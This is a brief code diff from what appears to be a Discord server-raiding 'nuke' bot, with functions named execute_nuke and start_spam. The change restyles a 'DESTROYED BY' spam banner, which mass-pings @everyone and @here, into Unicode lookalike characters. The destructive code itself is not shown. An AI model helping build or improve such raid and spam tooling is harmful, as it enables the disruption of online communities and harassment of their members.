@@ -453,7 +453,7 @@ async def execute_nuke(guild):
             await asyncio.sleep(2.0)
 
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ (●'◡'●)\n"
+            "# ≿≺✦≻≾ ᗫꗛꞆɌꗞᎽꗛᗫ ᗹᎽ ᗹꗞꕷꕷ ᗹẢꗞ ĐⱿ (●'◡'●) ≿≺✦≻≾\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             ' "|| Dont have a link support ||"'
@@ -615,7 +615,7 @@ async def start_spam(ctx):
     async def spam_loop():
         global is_spamming
         spam_text = (
-            "# DETROYED BY BOSS BẢO ĐZ (●'◡'●)\n"
+            "# ≿≺✦≻≾ ᗫꗛꞆɌꗞᎽꗛᗫ ᗹᎽ ᗹꗞꕷꕷ ᗹẢꗞ ĐⱿ (●'◡'●) ≿≺✦≻≾\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             ' "|| Dont have a link support ||"'
